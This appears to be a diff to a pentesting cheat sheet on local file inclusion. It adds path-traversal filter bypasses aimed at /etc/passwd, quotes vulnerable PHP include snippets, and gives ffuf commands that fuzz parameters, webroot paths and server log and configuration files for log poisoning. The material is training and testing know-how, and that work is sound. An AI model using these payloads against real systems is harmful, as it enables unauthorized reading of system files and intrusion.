@@ -133,15 +133,15 @@ if(req.query.language) {
 
 * #### Non-Recursive Path Traversal Filters <a href="#non-recursive-path-traversal-filters" id="non-recursive-path-traversal-filters"></a>
   * Basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.
-  * `$language = str_replace('../', '', $_GET['language']);`
-  * **Bypasses**: `..././`, `....////`, `....//` , `....\/`&#x20;
+  * `$language = str_replace('../', '', $_GET['language']);`  <sup><sub>(source-code)<sub></sup>
+  * **Bypasses**: `..././`, `....////`, `....//` , `....\/` , `.?/.*/.?/etc/passwd`
 * #### Encoding <a href="#encoding" id="encoding"></a>
   * Web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals.
   * Filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters.
   * Byapss: `%2e%2e%2f`&#x20;
 * #### Approved Paths <a href="#approved-paths" id="approved-paths"></a>
   * Web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
-  * `if(preg_match('/^./languages/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }`&#x20;
+  * `if(preg_match('/^./languages/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }` <sup><sub>(source-code)<sub></sup>
   * To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality.
   * Bypass: `allowed-path/../../../etc/passwd`&#x20;
 * #### Appended Extension <a href="#appended-extension" id="appended-extension"></a>
@@ -297,15 +297,34 @@ if(req.query.language) {
 
 ## Automated Scanning <a href="#automated-scanning" id="automated-scanning"></a>
 
+### Fuzzing Parameters <a href="#fuzzing-parameters" id="fuzzing-parameters"></a>
 
+* HTML forms users can use on web front-end tend to be properly tested and well secured against different web attacks.&#x20;
+* However, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
+* [hacktricks-file-inclusion#top-25-parameters](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
+* eg: `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?FUZZ=value'`&#x20;
 
+### Fuzzing LFI Payloads <a href="#lfi-wordlists" id="lfi-wordlists"></a>
 
+* [SecLists-Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
 
+### Fuzzing Server Files <a href="#fuzzing-server-files" id="fuzzing-server-files"></a>
 
+* #### Server Webroot
+  * If we wanted to locate a file we uploaded, but cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.
+  * We can fuzz for the `index.php` file through common webroot paths, which we can find in this [SecLists-default-web-root-directory-linux.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [SecLists-default-web-root-directory-windows.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.
+  * eg: `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ/index.php' -fs 2287`&#x20;
+* #### Server Logs/Configurations
+  * We need to identify the correct logs directory to be able to perform the log poisoning attacks we discussed.&#x20;
+  * We also need to read the server configurations to be able to identify the server webroot path and other important information.
+  * We may use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths. If we wanted a more precise scan, we can use [DragonJAR-LFI-WordList-Linux](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux) or [DragonJAR-LFI-WordList-Windows](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows)
+  * eg: `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ' -fs 2287`&#x20;
 
+### LFI Tools <a href="#lfi-tools" id="lfi-tools"></a>
 
-
-
+* [LFISuite](https://github.com/D35m0nd142/LFISuite)
+* [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
+* [liffy](https://github.com/mzfr/liffy)
 
 ## References
 
